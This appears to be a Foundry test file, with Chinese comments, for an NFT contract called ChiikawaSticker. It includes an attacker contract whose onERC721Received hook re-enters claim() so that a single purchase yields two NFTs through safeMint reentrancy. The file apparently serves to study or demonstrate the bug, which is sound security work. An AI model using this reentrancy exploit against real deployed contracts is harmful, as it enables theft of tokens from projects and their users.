// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ChiikawaSticker.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title AttackerContract
 * @dev 攻擊合約：利用 safeMint 的重入漏洞
 */
contract AttackerContract is IERC721Receiver {
    ChiikawaSticker public nftContract;
    bool public cnt = true;
    
    constructor(address _nftContract) {
        nftContract = ChiikawaSticker(_nftContract);
    }
    
    function buyAndClaimNftsWithTrick() external payable {
        // 步驟 1: 購買 NFT（付錢）
        nftContract.buyNFT{value: msg.value}();
        
        // 步驟 2: 領取 NFT（觸發重入攻擊）
        nftContract.claim();
    }
    
    // 惡意的 onERC721Received：會重入再次領取
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (cnt) {
            cnt = false;  // 避免無限循環
            nftContract.claim();  // 重入：再次領取！
        }
        return this.onERC721Received.selector;
    }
}

/**
 * @title SafeMintReentrancyTest
 * @dev 測試 safeMint 的重入漏洞
 */
contract SafeMintReentrancyTest is Test {
    ChiikawaSticker public nftContract;
    AttackerContract public attackerContract;
    
    address public owner = address(0x1234);
    address public normalUser = address(0x5678);
    
    uint256 public constant PRICE = 0.1 ether;
    uint256 public constant MAX_SUPPLY = 100;
    string public constant BASE_URI = "ipfs://QmChiikawa/";
    
    function setUp() public {
        vm.startPrank(owner);
        nftContract = new ChiikawaSticker(PRICE, MAX_SUPPLY, BASE_URI);
        vm.stopPrank();
        
        vm.deal(normalUser, 100 ether);
    }
    
    function testNormalUserFlow() public {
        vm.startPrank(normalUser);
        nftContract.buyNFT{value: PRICE}();
        assertTrue(nftContract.canClaim(normalUser));
        
        nftContract.claim();
        assertEq(nftContract.balanceOf(normalUser), 1);
        assertFalse(nftContract.canClaim(normalUser));
        vm.expectRevert("You must buy NFT first");
        nftContract.claim();
        
        vm.stopPrank();
    }
}
